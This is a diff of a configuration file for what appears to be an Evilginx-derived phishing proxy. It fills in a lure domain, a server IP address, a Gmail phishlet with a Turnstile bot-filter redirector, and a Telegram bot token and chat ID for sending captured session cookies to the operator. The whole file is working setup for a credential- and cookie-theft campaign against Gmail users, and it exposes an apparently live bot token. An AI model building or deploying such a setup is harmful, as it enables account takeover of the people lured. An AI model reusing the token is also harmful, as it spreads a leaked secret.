@@ -3,9 +3,9 @@
     "mode": "unauth"
   },
   "general": {
-    "domain": "",
+    "domain": "celticcommunications.co",
     "ipv4": "",
-    "external_ipv4": "",
+    "external_ipv4": "46.62.143.99",
     "bind_ipv4": "",
     "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
     "https_port": 443,
@@ -19,7 +19,7 @@
       "path": "/dVKozzmT",
       "redirect_url": "",
       "phishlet": "gmail",
-      "redirector": "/root/ginx/PROFGINX_CUSTOM/redirectors/turnstile/",
+      "redirector": "/root/Ginx/ProfGinx_V4/redirectors/turnstile/",
       "ua_filter": "",
       "info": "",
       "og_title": "",
@@ -103,8 +103,8 @@
     }
   },
   "telegram": {
-    "bot_token": "",
-    "chat_id": "",
+    "bot_token": "8422641861:AAEjgGbYEQKb0Ld5Fi73y34iLvgGN6s_RTE",
+    "chat_id": "-1003182594659",
     "enabled": false,
     "cookie_export_dir": "config/cookies"
   },
